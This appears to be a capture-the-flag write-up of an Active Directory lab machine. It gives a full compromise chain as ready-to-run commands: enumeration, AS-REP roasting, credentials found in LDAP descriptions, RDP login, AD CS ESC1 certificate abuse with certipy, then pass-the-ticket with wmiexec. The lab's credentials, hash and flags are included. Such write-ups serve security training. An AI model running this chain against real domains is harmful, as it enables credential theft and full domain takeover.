---
Status: "#Finished"
OS:
ip:
Start_Time: 2026-02-04 17:07
---

## 🔍 2. Information Gathering & Enumeration

### 2.1 Service Scanning
	For this machine, I tried to use browser to directly visit the target ip but failed. So it is clear that highly possible this target is using virtual hosting and only accept domain name visit. So I ran a nmap full scan first and found that this is highly possible an active domain room and the target has netbios and other ports opened. Then I ran a detailed service scan. The results show below.
```bash
# Nmap Full Scan
nmap -p- --min-rate 1000 -oN nmap_full.txt <IP>
# Nmap detailed scan
nmap -Pn -sV -sC -p <PORTS> <IP> -oN nmap_detailed
```

![](<assets/Pasted image 20260204175620.png>)

![](<assets/Pasted image 20260204175637.png>)
	The result shows that this is a active domain and it shows that the domain name and host name. I first modified the host file and then keep enumerating.

![](<assets/Pasted image 20260204180503.png>)
	I noticed that the target smb service is opened, so I tried smb enumeration.
```# smb anonymous visit
smbclient -L //10.80.155.137 -N
```
	I successfully get the response and connected, but there was no workgroup in smb.

![](<assets/Pasted image 20260204181201.png>)
	

	This time I used dirsearch to do a deeper enumeration. The results show below. I found a directory called aspnet_client, so I keep using dirsearch to do recursion enumeration on the target directory.

![](<assets/Pasted image 20260204213023.png>)
	


### 2.2 AD enumeration
	Now, I start using Impacket's script to try to enumeration. I used lookupsid.py to try to anonymously get usernames in AD. Then I used GetNPUsers.py with the usernames I got to try to do the AS-REP roasting. 

``` 
# Use this script for anonymously get usernames
lookupsid.py anonymous@10.80.155.137
```
```
# Use this script and usernames to perform AS-REP roasting
GetNPUsers.py thm.local/ -usersfile users.txt -format hashcat -outputfile hashes.asrep -dc-ip 10.80.155.137
```

![](<assets/Pasted image 20260204182622.png>)
	I wrote it into users.txt and then use GetNPUsers.py to brute force it.
![](<assets/Pasted image 20260204182746.png>)
	I got some user's hash.  Below is some screenshot. The hashes are too long so I didn't put them here.


![](<assets/Pasted image 20260204183141.png>)
	I tried to use hashcat to crack it but failed, so I came back and keep enumeration.
	I used enum4linux to do a complete enumeration. The result shows that target allowed null session.

![](<assets/Pasted image 20260204192723.png>)
	This time, I ran enum4linux-ng to completely enumerate the target again.

![](<assets/Pasted image 20260204204815.png>)
	This time I get another information, a username called yneelcey
```
Username:yneelcey
```
	However, I didn't found any service that can use this credential to login, so I keep enumerated.Because the target allows null sessions, this time I used netexec to do a deeper, complete scan. And by checking the information, I found two highly possible credential in description.

```
nxc ldap 10.80.131.149 -u '' -p '' --users
```

![](<assets/Pasted image 20260204221454.png>)
	I tried to use bloodhound directly to enumerate. The results are below.
![](<assets/Pasted image 20260205122605.png>)

![](<assets/Pasted image 20260205122723.png>)

	The results shows that SUSANNA is belonged to a remote desktop. But IVY doesn't belong to a remote desktop.
	So I decided to check for possible rdp for SUSANNA.

```
nxc rdp 10.82.181.0/24 -u 'SUSANNA_MCKNIGHT' -p 'CHANGEME2023!'
```

![](<assets/Pasted image 20260205123600.png>)
	This time I found a machine. Then I used xfreerdp3 to login.

```
xfreerdp3 /v:10.82.181.185 /u:SUSANNA_MCKNIGHT /p:'CHANGEME2023!' /d:thm.local /dynamic-resolution
```

![](<assets/Pasted image 20260205123654.png>)

![](<assets/Pasted image 20260205123705.png>)



	
##  3. Vulnerability Identification & Foothold
### 3.1 Foothold
	Winpeas and systeminfo gives us enough information, this is a really clear and strong machine that we can not find a local enumeration path. So this machine is highly possible a foothold for us for next moving. Under the user directory, I found another user but I don't have access to it.

![](<assets/Pasted image 20260205155429.png>)

	However, I found nothing here. No possible path. I back to AD enumeration and thinking for other possible path. I ran many nxc cmd and impacket to check for other possible information. And I found something here. The nxc cmd that enumerate the adcs, actually gave me the feedback that there is a CA.

```
nxc ldap 10.82.181.185 -u 'SUSANNA_MCKNIGHT' -p 'CHANGEME2023!' -M adcs 
```

![](<assets/Pasted image 20260205164500.png>)
	To check for any vulnerabilities, I ran certipy to check.

```
certipy find -u 'SUSANNA_MCKNIGHT@thm.local' -p 'CHANGEME2023!' -target 10.82.181.185 -stdout -vulnerable
```

![](<assets/Pasted image 20260205165432.png>)
![](<assets/Pasted image 20260205165444.png>)
	The results shows that it has ESC1. And the template is ServerAuth. Now we have escalation path.
##  4. Privilege Escalation

### 4.1 ESC1
	I tried to use certipy to require certification, but I faced netbios time out error.
	I realized this may be caused I am not using FQDN, so I added FQDN to the cmd.

```
certipy req -u 'SUSANNA_MCKNIGHT@thm.local' -p 'CHANGEME2023!' -target labyrinth.thm.local -ca thm-LABYRINTH-CA -template ServerAuth -upn administrator@thm.local -dc-ip 10.82.181.185
```
	This time it worked. 

![](<assets/Pasted image 20260205170528.png>)
	Next, I used certipy to require admin's hash and it returned.

```
certipy auth -pfx administrator.pfx -dc-ip 10.82.181.185
```

![](<assets/Pasted image 20260205170629.png>)
---
	At first I tried to use certipy and the NTLM hash to login, but failed due to the SMB restriction. I also tried psexec, but still failed. So I use getTGT to get a ticket first, and use that ticket to login.

![](<assets/Pasted image 20260205171259.png>)
	Failed due to restriction.

![](<assets/Pasted image 20260205171316.png>)
	Get the ticket and use this to login.
```use NTLM hash to get a ticket and export it
getTGT.py -hashes :07d677a6cf40925beb80ad6428752322 thm.local/administrator
export KRB5CCNAME=administrator.ccache
```
```  # Login via the ticket
wmiexec.py -k -no-pass thm.local/administrator@labyrinth.thm.local
```

![](<assets/Pasted image 20260205171446.png>)


---

##  6. Proof of Possession (Flags)
> [!DANGER] CRITICAL FOR OSCP
> The screenshot MUST contain: `whoami`, `ipconfig / ifconfig`, and the `flag` content in ONE terminal window.

| Flag Type    | Flag Content (Hash)           | Screenshot (Link)                           |
| :----------- | :---------------------------- | :------------------------------------------ |
| **user.txt** | THM{ENUMERATION_IS_THE_KEY}   | ![](<assets/Pasted image 20260205171737.png>) |
| **root.txt** | THM{THE_BYPASS_IS_CERTIFIED!} | ![](<assets/Pasted image 20260205171644.png>) |

---

